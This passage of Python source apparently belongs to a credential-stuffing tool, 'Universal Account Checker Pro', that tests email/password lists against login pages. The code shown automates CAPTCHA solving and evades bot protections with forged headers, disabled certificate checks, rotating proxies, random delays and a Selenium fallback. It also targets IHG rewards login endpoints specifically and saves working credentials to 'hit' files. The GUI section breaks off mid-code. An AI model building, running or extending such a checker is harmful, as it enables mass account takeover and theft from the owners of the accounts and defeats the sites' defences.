                # Try local CAPTCHA solver first (no external API needed)
                if self.local_captcha_solver and config.captcha_site_key:
                    try:
                        logger.info("Attempting local CAPTCHA solving without external API")
                        proxy_str = proxy['http'] if proxy and 'http' in proxy else None
                        captcha_token = self.local_captcha_solver.solve_captcha_auto(
                            config.captcha_page_url or config.login_url,
                            config.captcha_type,
                            config.captcha_site_key,
                            proxy_str,
                            timeout=60
                        )
                        if captcha_token:
                            logger.info("Successfully solved CAPTCHA locally!")
                            captcha_fields = self._get_captcha_field_candidates(config)
                    except Exception as local_exc:
                        logger.warning(f"Local CAPTCHA solver failed: {local_exc}")
                        captcha_token = None
                
                # Fallback to external API solver if local failed
                if not captcha_token and self.captcha_solver.is_enabled():
                    if config.captcha_site_key:
                        try:
                            captcha_token, captcha_provider_used = self.captcha_solver.solve(
                                config.captcha_type,
                                config.captcha_site_key,
                                config.captcha_page_url or config.login_url
                            )
                            captcha_fields = self._get_captcha_field_candidates(config)
                        except CaptchaSolverError as solver_exc:
                            result.status = CheckStatus.CAPTCHA_REQUIRED
                            result.response = f"Failed to solve CAPTCHA: {solver_exc}"
                            result.response_time = time.time() - start_time
                            return result
                    else:
                        result.status = CheckStatus.CAPTCHA_REQUIRED
                        result.response = "CAPTCHA detected but site key could not be extracted for solving"
                        result.response_time = time.time() - start_time
                        return result
                else:
                    result.status = CheckStatus.CAPTCHA_REQUIRED
                    result.response = "CAPTCHA detected on login page during analysis"
                    result.response_time = time.time() - start_time
                    return result
            
            # Create a new session for this request
            temp_session = requests.Session()
            
            # Apply advanced anti-bot headers and CSRF tokens
            session_headers = self._build_antibot_headers(config)
            for key, value in config.csrf_tokens.items():
                if key.lower() in ['csrf-token', 'x-csrf-token']:
                    session_headers[key] = value
            
            temp_session.headers.update(session_headers)
            temp_session.verify = False

            # Apply the retry strategy to the temp_session
            try:
                from requests.adapters import HTTPAdapter
                from urllib3.util.retry import Retry
                
                retry_strategy = Retry(
                    total=3,
                    backoff_factor=1,
                    status_forcelist=[429, 500, 502, 503, 504],
                )
                
                adapter = HTTPAdapter(max_retries=retry_strategy)
                temp_session.mount("http://", adapter)
                temp_session.mount("https://", adapter)
            except ImportError:
                logger.warning("Could not import Retry/HTTPAdapter. Retries will not be available.")

            # Warm-up requests for endpoints that expect cookies before authentication
            self._prime_login_session(temp_session, config, proxy, timeout)
            
            # Prepare login data based on auth method
            # Special handling for IHG sites - try multiple API endpoints
            if 'ihg.com' in site.lower():
                logger.info(f"Detected IHG site, using multi-endpoint strategy")
                response = self._try_ihg_endpoints(temp_session, config, email, password, proxy, timeout)
            elif config.auth_method == AuthMethod.FORM:
                login_data = self._prepare_form_data(config, email, password)
                if captcha_token:
                    for field in captcha_fields:
                        login_data[field] = captcha_token
                response = temp_session.post(
                    config.login_url,
                    data=login_data,
                    proxies=proxy,
                    timeout=timeout,
                    allow_redirects=True
                )
            elif config.auth_method == AuthMethod.JSON_API:
                login_data = self._prepare_json_data(config, email, password)
                if captcha_token:
                    for field in captcha_fields:
                        login_data[field] = captcha_token
                response = temp_session.post(
                    config.login_url,
                    json=login_data,
                    proxies=proxy,
                    timeout=timeout,
                    allow_redirects=False
                )
            else:
                # Try both form and JSON methods
                response = self._try_both_methods(
                    temp_session, config, email, password, proxy, timeout, captcha_token, captcha_fields
                )
            
            result.response_time = time.time() - start_time
            result.response = f"Status: {response.status_code}, Method: {config.auth_method.value}"
            if captcha_token and captcha_provider_used:
                result.response += f" | Captcha via {captcha_provider_used.value}"
            
            # Analyze response
            result.status = self._analyze_response(response, config)
            
            # Update proxy stats
            if proxy and use_proxies and 'http' in proxy:
                self.proxy_manager.mark_proxy_result(
                    proxy['http'], 
                    result.status == CheckStatus.SUCCESS
                )
            
            # Selenium fallback if request-based method failed and selenium is available
            if (result.status in [CheckStatus.FAILED, CheckStatus.UNKNOWN_ERROR, CheckStatus.CONNECTION_ERROR] 
                and self.use_selenium_fallback and self.selenium_login_helper):
                logger.info(f"Attempting Selenium fallback for {site}")
                try:
                    proxy_str = proxy['http'] if proxy and 'http' in proxy else None
                    selenium_result = self.selenium_login_helper.login_with_selenium(
                        site if site.startswith('http') else f'https://{site}',
                        email,
                        password,
                        proxy_str,
                        timeout
                    )
                    
                    if selenium_result.get('success'):
                        result.status = CheckStatus.SUCCESS
                        result.response = f"Selenium fallback successful: {selenium_result.get('final_url', '')}"
                        logger.info(f"✅ Selenium fallback succeeded for {email}")
                    else:
                        result.status = CheckStatus.FAILED
                        result.response = f"Selenium fallback failed: {selenium_result.get('error', 'Unknown')}"
                        logger.info(f"❌ Selenium fallback also failed for {email}")
                except Exception as selenium_exc:
                    logger.warning(f"Selenium fallback error: {selenium_exc}")
                    # Keep original status if selenium fallback errors
                
        except requests.exceptions.ProxyError as e:
            result.status = CheckStatus.PROXY_ERROR
            result.response = f"Proxy Error: {str(e)}"
        except requests.exceptions.ConnectTimeout as e:
            result.status = CheckStatus.TIMEOUT
            result.response = f"Connection Timeout: {str(e)}"
        except requests.exceptions.ConnectionError as e:
            result.status = CheckStatus.CONNECTION_ERROR
            result.response = f"Connection Error: {str(e)}"
        except requests.exceptions.ReadTimeout as e:
            result.status = CheckStatus.TIMEOUT
            result.response = f"Read Timeout: {str(e)}"
        except Exception as e:
            result.status = CheckStatus.UNKNOWN_ERROR
            result.response = f"Unexpected Error: {str(e)}"
            logger.error(f"Unexpected error checking account {email} on {site}: {e}")
        
        finally:
            if temp_session:
                temp_session.close()
        
        result.response_time = time.time() - start_time
        return result
    
    def _prepare_form_data(self, config: LoginConfig, email: str, password: str) -> Dict[str, str]:
        """Prepare form data for login"""
        data = {
            config.username_field: email,
            config.password_field: password
        }
        
        # Add additional fields and CSRF tokens
        data.update(config.additional_fields)
        # Add form-based CSRF tokens to data
        for key, value in config.csrf_tokens.items():
            if key.lower() not in ['csrf-token', 'x-csrf-token']:
                data[key] = value
        
        return data
    
    def _prepare_json_data(self, config: LoginConfig, email: str, password: str) -> Dict[str, str]:
        """Prepare JSON data for login"""
        data = {
            config.username_field: email,
            config.password_field: password
        }
        
        # Add additional fields
        data.update(config.additional_fields)
        
        return data
    
    def _try_both_methods(self, session: requests.Session, config: LoginConfig, 
                         email: str, password: str, proxy: Optional[Dict], 
                         timeout: int, captcha_token: Optional[str] = None,
                         captcha_fields: Optional[List[str]] = None) -> requests.Response:
        """Try both form and JSON methods"""
        # Try form first
        try:
            form_data = self._prepare_form_data(config, email, password)
            if captcha_token and captcha_fields:
                for field in captcha_fields:
                    form_data[field] = captcha_token
            response = session.post(
                config.login_url,
                data=form_data,
                proxies=proxy,
                timeout=timeout,
                allow_redirects=True
            )
            return response
        except:
            pass
        
        # Try JSON
        json_data = self._prepare_json_data(config, email, password)
        if captcha_token and captcha_fields:
            for field in captcha_fields:
                json_data[field] = captcha_token
        return session.post(
            config.login_url,
            json=json_data,
            proxies=proxy,
            timeout=timeout,
            allow_redirects=False
        )
    
    def _try_ihg_endpoints(self, session: requests.Session, config: LoginConfig,
                          email: str, password: str, proxy: Optional[Dict],
                          timeout: int) -> requests.Response:
        """Try multiple IHG API endpoints for maximum compatibility.
        
        IHG has several potential API endpoints that may change over time.
        This method tries them in order of likelihood until one works.
        """
        # List of potential IHG API endpoints to try
        ihg_endpoints = [
            "https://www.ihg.com/rewardsclub/api/v1/signin",
            "https://www.ihg.com/rewardsclub/api/signin", 
            "https://www.ihg.com/api/member/authenticate",
            "https://www.ihg.com/api/v1/auth/signin",
            "https://www.ihg.com/rewardsclub/api/authenticate",
            "https://www.ihg.com/rewardsclub/us/en/api/signin"
        ]
        
        # Prepare login data
        json_data = self._prepare_json_data(config, email, password)
        
        last_response = None
        successful_endpoint = None
        
        for endpoint in ihg_endpoints:
            try:
                logger.info(f"Trying IHG endpoint: {endpoint}")
                response = session.post(
                    endpoint,
                    json=json_data,
                    proxies=proxy,
                    timeout=timeout,
                    allow_redirects=False
                )
                
                # If we get a response that's not 404 or 501, we found a working endpoint
                if response.status_code not in [404, 501, 502, 503]:
                    successful_endpoint = endpoint
                    logger.info(f"Found working IHG endpoint: {endpoint} (Status: {response.status_code})")
                    return response
                    
                last_response = response
                logger.debug(f"IHG endpoint {endpoint} returned {response.status_code}")
                
            except requests.exceptions.RequestException as e:
                logger.debug(f"IHG endpoint {endpoint} failed: {e}")
                continue
        
        # If all endpoints failed, return the last response we got (or raise error)
        if last_response:
            logger.warning(f"All IHG endpoints returned non-success codes. Using last response.")
            return last_response
        else:
            # All endpoints failed completely, try a fallback
            logger.error(f"All IHG endpoints failed to respond")
            raise requests.exceptions.ConnectionError("All IHG API endpoints failed to respond")
    
    def _analyze_response(self, response: requests.Response, config: LoginConfig) -> CheckStatus:
        """Analyze a login response and classify it into a check status."""
        response_text = self._normalize_response_text(response.text)

        response_json_text = ""
        json_values: List[str] = []
        try:
            parsed_json = response.json()
        except ValueError:
            parsed_json = None

        if parsed_json is not None:
            response_json_text = self._normalize_response_text(json.dumps(parsed_json))
            json_values = self._extract_json_strings(parsed_json)

        captcha_keywords = ['captcha', 'recaptcha', 'hcaptcha', 'funcaptcha', 'arkose']
        if (
            self._contains_any_keyword(response_text, captcha_keywords)
            or self._contains_any_keyword(response_json_text, captcha_keywords)
        ):
            return CheckStatus.CAPTCHA_REQUIRED
        
        if parsed_json is not None:
            corp_status = self._analyze_corp_person_response(parsed_json)
            if corp_status is not None:
                return corp_status

        success_in_values = any(
            any(indicator in value for indicator in config.success_indicators)
            for value in json_values
        )
        failure_in_values = any(
            any(indicator in value for indicator in config.failure_indicators)
            for value in json_values
        )

        has_success = success_in_values
        if not has_success and not json_values:
            has_success = (
                self._contains_any_keyword(response_text, config.success_indicators)
                or self._contains_any_keyword(response_json_text, config.success_indicators)
            )

        has_failure = failure_in_values
        if not has_failure and not json_values:
            has_failure = (
                self._contains_any_keyword(response_text, config.failure_indicators)
                or self._contains_any_keyword(response_json_text, config.failure_indicators)
            )

        two_factor_required = self._is_two_factor_challenge(
            response=response,
            response_text=response_text,
            response_json_text=response_json_text,
            has_failure=has_failure,
        )

        if response.status_code == 429:
            return CheckStatus.RATE_LIMITED

        if response.status_code == 401:
            return CheckStatus.TWO_FACTOR_REQUIRED if two_factor_required else CheckStatus.FAILED

        if response.status_code == 403:
            if two_factor_required and not has_failure:
                return CheckStatus.TWO_FACTOR_REQUIRED
            return CheckStatus.FAILED

        if response.status_code == 200:
            if has_success:
                return CheckStatus.SUCCESS
            if two_factor_required:
                return CheckStatus.TWO_FACTOR_REQUIRED
            if has_failure:
                return CheckStatus.FAILED

            if json_values:
                truthy_values = {'true', '1', 'ok', 'yes', 'authenticated'}
                falsy_values = {'false', '0', 'no'}
                if any(value in truthy_values for value in json_values):
                    return CheckStatus.SUCCESS
                if any(value in falsy_values for value in json_values):
                    return CheckStatus.FAILED

            return CheckStatus.FAILED

        if two_factor_required and not has_failure:
            return CheckStatus.TWO_FACTOR_REQUIRED

        if has_failure or response.status_code in (400, 404):
            return CheckStatus.FAILED

        return CheckStatus.UNKNOWN_ERROR
    
    def save_result(self, result: CheckResult):
        """Save result to appropriate file"""
        # MODIFIED: Clean site name for filenames and categorize by status
        clean_site_name = re.sub(r'[^a-zA-Z0-9_-]', '_', urlparse(result.site).netloc)
        
        # Determine filename based on status
        if result.status == CheckStatus.SUCCESS:
            filename = f"{clean_site_name}_hit.txt"
        elif result.status == CheckStatus.TWO_FACTOR_REQUIRED:
            filename = f"{clean_site_name}_2fa.txt"
        elif result.status == CheckStatus.CAPTCHA_REQUIRED:
            filename = f"{clean_site_name}_captcha.txt"
        elif result.status == CheckStatus.FAILED:
            filename = f"{clean_site_name}_failed.txt"
        else:
            filename = f"{clean_site_name}_other.txt"
        
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"Site: {result.site}\n")
                f.write(f"Email: {result.email}\n")
                f.write(f"Password: {result.password}\n")
                f.write(f"Status: {result.status.value}\n")
                f.write(f"Auth Method: {result.auth_method.value}\n")
                f.write(f"Response Time: {result.response_time:.2f}s\n")
                f.write(f"Timestamp: {result.timestamp}\n")
                f.write(f"Proxy: {result.proxy_used}\n")
                f.write(f"Response: {result.response}\n")
                f.write("-" * 80 + "\n")
        except Exception as e:
            logger.error(f"Error saving result: {e}")
    
    def update_stats(self, result: CheckResult):
        """Update statistics"""
        with self.lock:
            self.stats['checked'] += 1
            if result.status == CheckStatus.SUCCESS:
                self.stats['success'] += 1
            elif result.status == CheckStatus.FAILED:
                self.stats['failed'] += 1
            elif result.status == CheckStatus.RATE_LIMITED:
                self.stats['rate_limited'] += 1
            elif result.status == CheckStatus.CAPTCHA_REQUIRED:
                self.stats['captcha'] += 1
            elif result.status == CheckStatus.TWO_FACTOR_REQUIRED:
                self.stats['2fa'] += 1
            else:
                self.stats['errors'] += 1
    
    def mass_check_accounts(self, accounts: List[Tuple[str, str, str]], 
                          default_site: str, # NEW: Added default site
                          max_workers: int = 10,
                          timeout: int = 30,
                          delay: Tuple[float, float] = (1, 3),
                          use_proxies: bool = True,
                          proxy_type: ProxyType = ProxyType.ANY):
        """Mass check accounts with concurrent processing and enhanced error handling"""
        self.running = True
        total_accounts = len(accounts)
        processed = 0
        
        def process_account(account):
            nonlocal processed
            if not self.running:
                return None
            
            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    site, email, password = account
                    
                    # NEW: Use default site if account file doesn't specify one
                    if site == 'default':
                        site = default_site
                    
                    # Get proxy with rotation for each attempt
                    proxy = self.proxy_manager.get_proxy(proxy_type, use_proxies)
                    
                    if use_proxies and proxy:
                        logger.debug(f"Got proxy for {email}: {proxy.get('http', 'unknown')}")
                    elif use_proxies and not proxy:
                        logger.warning(f"Failed to get proxy for {email} (use_proxies=True, total={self.proxy_manager.get_proxy_count()})")
                    
                    result = self.check_account(site, email, password, proxy, timeout, use_proxies)
                    
                    # If proxy error, retry with different proxy
                    if result.status == CheckStatus.PROXY_ERROR and retry_count < max_retries - 1:
                        retry_count += 1
                        logger.info(f"Proxy error for {email}, retrying with different proxy ({retry_count}/{max_retries})")
                        continue
                    
                    # If rate limited, wait and retry
                    if result.status == CheckStatus.RATE_LIMITED and retry_count < max_retries - 1:
                        retry_count += 1
                        wait_time = (retry_count + 1) * 5  # Exponential backoff
                        logger.info(f"Rate limited for {email}, waiting {wait_time}s before retry")
                        time.sleep(wait_time)
                        continue
                    
                    self.save_result(result)
                    self.update_stats(result)
                    
                    with self.lock:
                        processed += 1
                    
                    # Random delay between requests
                    if delay:
                        time.sleep(random.uniform(delay[0], delay[1]))
                    
                    return result
                    
                except Exception as e:
                    logger.error(f"Error processing {email}: {e}")
                    retry_count += 1
                    if retry_count >= max_retries:
                        # Create error result
                        result = CheckResult(
                            email=email,
                            password=password,
                            status=CheckStatus.UNKNOWN_ERROR,
                            response=str(e),
                            proxy_used="Unknown",
                            response_time=0,
                            timestamp=datetime.now(),
                            site=account[0],
                            auth_method=AuthMethod.UNKNOWN
                        )
                        self.save_result(result)
                        return result
            
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_account, account) for account in accounts]
            
            for future in concurrent.futures.as_completed(futures):
                if not self.running:
                    executor.shutdown(wait=False)
                    break
                    
                try:
                    result = future.result()
                    if result:
                        yield result
                except Exception as e:
                    logger.error(f"Error in account processing: {e}")
    
    def stop_checking(self):
        """Stop the mass checking process"""
        self.running = False

class UniversalCheckerGUI:
    """GUI class - only available when tkinter is installed"""
    def __init__(self, root):
        self.root = root
        self.root.title(f"Universal Account Checker Pro v{__version__} - By {__author__}")
        
        # Get screen dimensions
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        
        # Calculate window size (80% of screen)
        window_width = min(int(screen_width * 0.8), 1400)
        window_height = min(int(screen_height * 0.8), 1000)
        
        # Calculate position for center of screen
        x_pos = (screen_width - window_width) // 2
        y_pos = (screen_height - window_height) // 2
        
        # Set geometry
        self.root.geometry(f"{window_width}x{window_height}+{x_pos}+{y_pos}")
        self.root.minsize(800, 600)  # Set minimum size
        self.root.resizable(True, True)
        
        # Configure grid weights for resizing
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_rowconfigure(0, weight=1)
        
        self.checker = UniversalAccountChecker()
        self.setup_ui()
        
    def _on_mousewheel(self, event):
        """Handle mouse wheel scrolling"""
        if event.state & 4:  # Control key pressed
            # Zoom functionality could be added here
            return
        else:
            self.canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
    
    def _on_vertical_arrow(self, event):
        """Handle up/down arrow keys"""
        if event.keysym == 'Up':
            self.canvas.yview_scroll(-1, "units")
        elif event.keysym == 'Down':
            self.canvas.yview_scroll(1, "units")
    
    def _on_page_updown(self, event):
        """Handle Page Up/Down keys"""
        if event.keysym == 'Prior':  # Page Up
            self.canvas.yview_scroll(-1, "pages")
        elif event.keysym == 'Next':  # Page Down
            self.canvas.yview_scroll(1, "pages")

    def _on_configure(self, event):
        """Update scroll region when window is configured"""
        # Update the scroll region
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        
        # Get the current canvas and window dimensions
        canvas_width = self.canvas.winfo_width()
        frame_width = event.width
        
        # Determine if vertical scrollbar is needed
        if frame_width <= canvas_width:
            self.h_scrollbar.pack_forget()
        else:
            self.h_scrollbar.pack(side="bottom", fill="x")
        
        # Ensure minimum size
        min_width = 800  # minimum width
        if canvas_width < min_width:
            self.canvas.configure(width=min_width)
        
    def _bind_mousewheel(self, widget):
        """Recursively bind mousewheel to all children"""
        widget.bind('<MouseWheel>', self._on_mousewheel)
        widget.bind('<Shift-MouseWheel>', lambda e: self.canvas.xview_scroll(int(-1 * (e.delta / 120)), "units"))
        
        # Special handling for text widgets to allow their native scrolling
        if isinstance(widget, (tk.Text, scrolledtext.ScrolledText)):
            widget.bind('<MouseWheel>', lambda e: 'break', add='+')
        
        for child in widget.winfo_children():
            self._bind_mousewheel(child)
    
    def setup_ui(self):
        """Setup the enhanced user interface with scrolling support"""
        # Create canvas and scrollbars
        canvas_frame = ttk.Frame(self.root)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        # Both vertical and horizontal scrollbars
        self.v_scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical")
        self.h_scrollbar = ttk.Scrollbar(canvas_frame, orient="horizontal")
        self.canvas = tk.Canvas(canvas_frame, 
                               yscrollcommand=self.v_scrollbar.set,
                               xscrollcommand=self.h_scrollbar.set)
        
        # Configure scrollbar commands
        self.v_scrollbar.configure(command=self.canvas.yview)
        self.h_scrollbar.configure(command=self.canvas.xview)
        
        # Layout scrollbars and canvas
        self.v_scrollbar.pack(side="right", fill="y")
        self.h_scrollbar.pack(side="bottom", fill="x")
        self.canvas.pack(side="left", fill="both", expand=True)
        
        # Bind keyboard navigation
        self.canvas.bind('<Up>', self._on_vertical_arrow)
        self.canvas.bind('<Down>', self._on_vertical_arrow)
        self.canvas.bind('<Prior>', self._on_page_updown)
        self.canvas.bind('<Next>', self._on_page_updown)
        
        # Make canvas focusable
        self.canvas.configure(takefocus=1)
        
        # Main frame inside canvas
        main_frame = ttk.Frame(self.canvas, padding="10")
        
        # Create window in canvas for main frame
        self.canvas_frame = self.canvas.create_window((0, 0), window=main_frame, anchor="nw", tags="main_frame")
        
        # Configure weights and bindings
        main_frame.bind("<Configure>", self._on_configure)
        self.canvas.bind('<Configure>', lambda e: self.canvas.itemconfig(
            "main_frame", width=max(e.width - 20, main_frame.winfo_reqwidth())))
        
        # Bind mouse wheel to all widgets
        self._bind_mousewheel(main_frame)
        
        # Create main container frames for better organization
        site_container = ttk.Frame(main_frame)
        site_container.pack(fill=tk.X, pady=5)
        
        preview_container = ttk.Frame(main_frame)
        preview_container.pack(fill=tk.X, pady=5)
        
        settings_container = ttk.Frame(main_frame)
        settings_container.pack(fill=tk.X, pady=5)
        
        results_container = ttk.Frame(main_frame)
        results_container.pack(fill=tk.BOTH, expand=True)
        
        # Container frames for better organization
        title_frame = ttk.Frame(main_frame)
        title_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Title
        title_label = ttk.Label(title_frame, text="Universal Account Checker Pro v4.0", 
                               font=('Arial', 16, 'bold'))
        title_label.pack(fill=tk.X, pady=5)
        
        # Site configuration section
        site_frame = ttk.LabelFrame(main_frame, text="Site Configuration", padding="10")
        site_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Site URL container
        site_url_frame = ttk.Frame(site_frame)
        site_url_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(site_url_frame, text="Default Site URL:").pack(side=tk.LEFT, padx=(0, 5))
        self.default_site_var = tk.StringVar(value="https://example.com")
        ttk.Entry(site_url_frame, textvariable=self.default_site_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        ttk.Button(site_url_frame, text="Analyze Site", command=self.analyze_site).pack(side=tk.LEFT)

        # Credentials for auto-login
        # Credentials frame
        creds_frame = ttk.Frame(site_frame)
        creds_frame.pack(fill=tk.X, pady=5)
        
        # Email row
        email_frame = ttk.Frame(creds_frame)
        email_frame.pack(fill=tk.X, pady=2)
        ttk.Label(email_frame, text="Email:", width=10).pack(side=tk.LEFT)
        self.site_email_var = tk.StringVar()
        ttk.Entry(email_frame, textvariable=self.site_email_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Password row
        pass_frame = ttk.Frame(creds_frame)
        pass_frame.pack(fill=tk.X, pady=2)
        ttk.Label(pass_frame, text="Password:", width=10).pack(side=tk.LEFT)
        self.site_password_var = tk.StringVar()
        ttk.Entry(pass_frame, textvariable=self.site_password_var, show='*').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Action buttons frame
        action_frame = ttk.Frame(site_frame)
        action_frame.pack(fill=tk.X, pady=5)
        
        # Button container
        button_container = ttk.Frame(action_frame)
        button_container.pack(side=tk.RIGHT)
        
        self.start_site_button = ttk.Button(button_container, text="Start Site Auto-Check", 
                                          command=self.start_site_auto_check)
        self.start_site_button.pack(side=tk.LEFT, padx=2)
        
        self.stop_site_button = ttk.Button(button_container, text="Stop Site Check", 
                                         command=self.stop_site_check, state=tk.DISABLED)
        self.stop_site_button.pack(side=tk.LEFT, padx=2)
        
        # Options frame for checkboxes
        options_frame = ttk.Frame(site_frame)
        options_frame.pack(fill=tk.X, pady=5)
        
        # Options container (right-aligned)
        options_container = ttk.Frame(options_frame)
        options_container.pack(side=tk.RIGHT, padx=5)
        
        # Options: Use Playwright (if installed), Use Proxy for auto-check, Save results
        self.use_playwright_var = tk.BooleanVar(value=False)
        playwright_cb = ttk.Checkbutton(options_container, text="Use Headless Browser (Playwright)", 
                                       variable=self.use_playwright_var)
        playwright_cb.pack(anchor=tk.W, pady=2)

        self.use_proxy_for_site_var = tk.BooleanVar(value=False)
        proxy_cb = ttk.Checkbutton(options_container, text="Use Proxy for Site Auto-Check", 
                                  variable=self.use_proxy_for_site_var)
        proxy_cb.pack(anchor=tk.W, pady=2)

        self.save_results_var = tk.BooleanVar(value=False)
        save_cb = ttk.Checkbutton(options_container, text="Save Results (JSON/CSV)", 
                                 variable=self.save_results_var)
        save_cb.pack(anchor=tk.W, pady=2)

        # Save path frame
        save_path_frame = ttk.Frame(site_frame)
        save_path_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(save_path_frame, text="Save Path:").pack(side=tk.LEFT, padx=(0,5))
        
        # Save path entry
        self.save_path_var = tk.StringVar(value=str(Path.cwd() / "site_auto_check_results"))
        ttk.Entry(save_path_frame, textvariable=self.save_path_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        ttk.Button(save_path_frame, text="Browse Save Path", 
                   command=self.browse_save_path).pack(side=tk.LEFT, padx=(0,5))
        
        # Site info display (with detailed context) 
        self.site_info_text = scrolledtext.ScrolledText(site_frame, height=6, width=80)
        self.site_info_text.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        self.site_info_text.tag_configure('success', foreground='green')
        self.site_info_text.tag_configure('warning', foreground='orange')
        self.site_info_text.tag_configure('error', foreground='red')
        self.site_info_text.tag_configure('bold', font=('TkDefaultFont', 9, 'bold'))

        # HTML viewer frame
        html_frame = ttk.Frame(site_frame)
        html_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(html_frame, text="Full Page HTML:").pack(anchor=tk.W)
        self.site_html_text = scrolledtext.ScrolledText(html_frame, height=12, width=120)
        self.site_html_text.pack(fill=tk.BOTH, expand=True, pady=(2,0))

        # Login links frame
        links_frame = ttk.Frame(site_frame)
        links_frame.pack(fill=tk.X, pady=(5,0))
        
        ttk.Label(links_frame, text="Detected Login/Sign-in Links:").pack(anchor=tk.W)
        self.login_links_listbox = tk.Listbox(links_frame, height=6)
        self.login_links_listbox.pack(fill=tk.BOTH, expand=True, pady=(2,0))
        self.login_links_listbox.bind('<Double-Button-1>', self.on_login_link_double_click)

        # Site auto-check state
        self.site_checking_thread = None
        self.site_checking_running = False
        
        # File and site selection section
        file_frame = ttk.LabelFrame(preview_container, text="File & Site Selection", padding="10")
        file_frame.pack(fill=tk.X, pady=5)
        
        # Default site selector aligned with accounts browsing
        site_select_frame = ttk.Frame(file_frame)
        site_select_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(site_select_frame, text="Default Site:", width=15).pack(side=tk.LEFT)
        self.site_selector = ttk.Combobox(
            site_select_frame,
            textvariable=self.default_site_var,
            state="normal"
        )
        self.site_selector.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.site_selector.bind("<<ComboboxSelected>>", self._on_site_selector_change)
        self.site_selector.bind("<FocusOut>", self._on_site_selector_change)
        ttk.Button(site_select_frame, text="Refresh", command=self.refresh_site_selector_options).pack(side=tk.LEFT, padx=(5, 0))
        self.refresh_site_selector_options()
        
        # Accounts file selection
        accounts_frame = ttk.Frame(file_frame)
        accounts_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(accounts_frame, text="Accounts File:", width=15).pack(side=tk.LEFT)
        self.accounts_file = tk.StringVar()
        ttk.Entry(accounts_frame, textvariable=self.accounts_file).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        ttk.Button(accounts_frame, text="Browse", command=self.browse_accounts_file).pack(side=tk.LEFT)
        
        # Proxy configuration
        proxy_frame = ttk.Frame(file_frame)
        proxy_frame.pack(fill=tk.X, pady=(10, 0))
        
        ttk.Label(proxy_frame, text="Proxy Files (Optional):", font=('Arial', 9, 'bold')).pack(anchor=tk.W, pady=(5, 10))
        
        # Create container for proxy sections
        proxy_sections = ttk.Frame(proxy_frame)
        proxy_sections.pack(fill=tk.X, expand=True, pady=5)
        
        # Left section
        left_section = ttk.Frame(proxy_sections)
        left_section.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0,10))
        
        # Right section
        right_section = ttk.Frame(proxy_sections)
        right_section.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(10,0))
        
        proxy_types_left = [
            ("HTTP Proxies:", "http_proxies_file"),
            ("SOCKS4 Proxies:", "socks4_proxies_file"),
            ("Residential Proxies:", "residential_proxies_file"),
        ]
        
        proxy_types_right = [
            ("HTTPS Proxies:", "https_proxies_file"),
            ("SOCKS5 Proxies:", "socks5_proxies_file"),
            ("Datacenter Proxies:", "datacenter_proxies_file"),
        ]
        
        self.proxy_files = {}
        
        def create_proxy_row(parent, label_text, var_name):
            row = ttk.Frame(parent)
            row.pack(fill=tk.X, pady=2)
            
            ttk.Label(row, text=label_text, width=15).pack(side=tk.LEFT)
            self.proxy_files[var_name] = tk.StringVar()
            ttk.Entry(row, textvariable=self.proxy_files[var_name]).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
            ttk.Button(row, text="Browse", 
                      command=lambda v=var_name: self.browse_proxy_file(v)).pack(side=tk.LEFT)
        
        # Create left column rows
        for label, var_name in proxy_types_left:
            create_proxy_row(left_section, label, var_name)
        
        # Create right column rows
        for label, var_name in proxy_types_right:
            create_proxy_row(right_section, label, var_name)
        
        # Settings section
        settings_frame = ttk.LabelFrame(settings_container, text="Settings", padding="10")
        settings_frame.pack(fill=tk.X, pady=5)
        
        # Settings rows container
        settings_rows = ttk.Frame(settings_frame)
        settings_rows.pack(fill=tk.X, pady=5)
        
        # First row of settings
        settings_row1 = ttk.Frame(settings_rows)
        settings_row1.pack(fill=tk.X, pady=2)
        
        # Threads section
        threads_frame = ttk.Frame(settings_row1)
        threads_frame.pack(side=tk.LEFT, padx=(0,20))
        ttk.Label(threads_frame, text="Threads:").pack(side=tk.LEFT)
        self.threads_var = tk.StringVar(value="10")
        ttk.Entry(threads_frame, textvariable=self.threads_var, width=10).pack(side=tk.LEFT, padx=5)
        
        # Timeout section
        timeout_frame = ttk.Frame(settings_row1)
        timeout_frame.pack(side=tk.LEFT, padx=20)
        ttk.Label(timeout_frame, text="Timeout (s):").pack(side=tk.LEFT)
        self.timeout_var = tk.StringVar(value="30")
        ttk.Entry(timeout_frame, textvariable=self.timeout_var, width=10).pack(side=tk.LEFT, padx=5)
        
        # Use Proxies section
        proxies_frame = ttk.Frame(settings_row1)
        proxies_frame.pack(side=tk.LEFT, padx=20)
        ttk.Label(proxies_frame, text="Use Proxies:").pack(side=tk.LEFT)
        self.use_proxies_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(proxies_frame, variable=self.use_proxies_var).pack(side=tk.LEFT, padx=5)
        
        # Second row of settings
        settings_row2 = ttk.Frame(settings_rows)
        settings_row2.pack(fill=tk.X, pady=2)
        
        # Delay settings
        delay_frame = ttk.Frame(settings_row2)
        delay_frame.pack(side=tk.LEFT, padx=(0,20))
        
        ttk.Label(delay_frame, text="Delay (min-max):").pack(side=tk.LEFT)
        self.delay_min_var = tk.StringVar(value="1")
